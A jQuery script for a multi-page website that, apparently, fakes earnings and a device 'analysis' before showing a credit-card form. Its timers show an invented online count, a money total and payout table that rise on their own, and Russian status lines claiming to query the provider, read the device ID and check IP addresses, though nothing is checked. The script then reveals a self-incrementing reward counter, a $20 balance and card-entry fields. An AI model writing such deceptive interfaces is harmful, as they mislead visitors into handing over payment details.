$(function() {

  // index.html


  // Slider

  $(".social__inner").slick({
    arrows: false,
    slidesToShow: 4,
    slidesToScroll: 1,
    autoplay: true,
    autoplaySpeed: 5000,
    responsive: [
      {
        breakpoint: 720,
        settings: {
          slidesToShow: 3
        }
      },
      {
        breakpoint: 480,
        settings: {
          slidesToShow: 2
        }
      }
    ]
  });

  // Burger

  $("#nav__toggle").on("click", function(event) {
    event.preventDefault();

    $(this).toggleClass("show");
    $("#nav").toggleClass("show");
  });

  // Inner HTML

  let online = 5;
  $("#online").html(online);

  let money = 50000;
  $("#money").html(money);

  function addMoney() {
    money += 2000;
    $("#money").html(money);
  }

  setInterval(addMoney, 3000);

  // Loading

  function loadInfo() {
    for (let i = 0; i < 100; i++) {
      $("#load").animate(
        { borderSpacing: -360 },
        {
          step: function(now, fx) {
            $(this).css("-webkit-transform", "rotate(" + now + "deg)");
            $(this).css("-moz-transform", "rotate(" + now + "deg)");
            $(this).css("transform", "rotate(" + now + "deg)");
          },
          duration: "slow"
        },
        "linear"
      );
    }

    function changeInfo() {
      $("#infoBody").css("display", "block");
      $("#load").css("display", "none");
    }

    setTimeout(changeInfo, 8000);
  }

  loadInfo();

  // Auth Btn

  function heartBtn() {
    $("#authBtn").addClass("animation");
  }

  function remHearBtn() {
    $("#authBtn").removeClass("animation");
  }

  setInterval(remHearBtn, 100);
  setInterval(heartBtn, 500);

  // Table

  let date = new Date();
  let year = date.getFullYear();
  let month = date.getMonth();
  let day = date.getDate();
  let hour = date.getHours();
  let minutes = date.getMinutes();

  $(".date").html(day + "." + month + "." + year + " " + hour + ":" + minutes);

  // function addPayItem() {
  //   $('.payout__item:first-child').css('display', 'flex');
  //   $('.payout__item:last-child').css('display', 'none');
  // }

  // setInterval(addPayItem, 2000);

  // function addPayItem() {
  //   $(".payout__wrapper:first-child").css("display", "none");
  //   $(".payout__wrapper:nth-child(2)").css("display", "block");
  // }

  // function addPayItem2() {
  //   $(".payout__wrapper:nth-child(2)").css("display", "none");
  //   $(".payout__wrapper:last-child").css("display", "block");
  // }

  // setTimeout(addPayItem, 3000);
  // setTimeout(addPayItem2, 6000);

   function addPayItem1() {
    $('#payout-1').hide(800);
    $('#payout-2').show(500);
  }

  function addPayItem2() {
    $('#payout-2').hide(800);
    $('#payout-3').show(500);
  }

  function addPayItem3() {
    $('#payout-3').hide(800);
    $('#payout-1').show(500);
  }

  function setChangeTable() {
    setTimeout(addPayItem1, 5000);
    setTimeout(addPayItem2, 10000);
    setTimeout(addPayItem3, 15000);
  }

  setChangeTable();

  setInterval(setChangeTable, 30000);

  // service__action.html

  // Preloader
  var $preloader = $('#p_prldr'),
        $svg_anm   = $preloader.find('.svg_anm');
    $preloader.delay(55000).fadeOut('slow');

  // Text change and hide

    function changeText() {
      $('#pre__text').text('Запрос к провайдеру...');
    }

    function changeText2() {
      $('#pre__text').text('Определение ID устройства...');
    }

    function changeText3() {
      $('#pre__text').text('Сверка используемых IP адресов...');
    }

    function changeText4() {
      $('#pre__text').text('');
    }

    setTimeout(changeText, 5000);
    setTimeout(changeText2, 10000);
    setTimeout(changeText3, 15000);
    setTimeout(changeText4, 20000);

    // Analys Show

    function pridrTitle() {
      $('#pridr__view').show(500);
    }

    setTimeout(pridrTitle, 20000);

    function pridrSocial() {
      $('#pridr__social').show(500);
    }

    setTimeout(pridrSocial, 25000);

    function pridrMessanger() {
      $('#pridr__messanger').show(500);
    }

    setTimeout(pridrMessanger, 30000);

    function pridrVideo() {
      $('#pridr__video').show(500);
    }

    setTimeout(pridrVideo, 35000);

     // Analys Hide

     function analysHide() {
      $('#pridr__view').hide(500);
      $('#pridr__social').hide(500);
      $('#pridr__messanger').hide(500);
      $('#pridr__video').hide(500);
    }

    setTimeout(analysHide, 40000);

    // Content Show

    function pridrContent() {
      $('#pridr__content').show(500);
    }

    setTimeout(pridrContent, 40000);

    function pridrCabinet() {
      $('#pridr__cabinet').show(500);
    }

    setTimeout(pridrCabinet, 45000);

    // Content Hide

    function contentHide() {
      $('#pridr__content').show(500);
      $('#pridr__cabinet').show(500);
      $('#pridr__content').hide(500);
      $('#pridr__cabinet').hide(500);
    }

    setTimeout(contentHide, 50000);

    function pridrReward() {
      $('#pridr__reward').show(500);
    }

    setTimeout(pridrReward, 50000);

    function pridrMoney() {
      $('#pridr__money').show(500);
    }

    setTimeout(pridrMoney, 50000);

    // Moneys

    let pridr__money = 0;
    $('#gold__money').html(pridr__money);

    function incrMoney() {
      pridr__money += 1;
      $("#gold__money").html(pridr__money);
    }

    setInterval(incrMoney, 300);

    // service__output.html

    // Blalance
    let balance = 20;
    $('.balance').html('$' + balance);

    // Cards Form

    var creditly = Creditly.initialize(
      '.creditly-wrapper .credit-card-number',
      '.creditly-wrapper .card-type');
});
